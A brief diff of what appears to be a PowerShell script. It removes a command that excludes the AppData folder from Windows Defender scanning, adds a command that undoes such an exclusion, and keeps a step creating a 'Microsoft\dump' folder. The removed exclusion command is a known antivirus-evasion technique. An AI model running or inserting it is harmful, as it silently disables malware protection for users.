@@ -1,5 +1,6 @@
 # Adding Windows Defender exclusion path
-Add-MpPreference -ExclusionPath "$env:appdata"
+Remove-MpPreference -ExclusionPath "$env:appdata" -ErrorAction SilentlyContinue
+
 
 # Creating the directory we will work on
 mkdir "$env:appdata\Microsoft\dump" -Force
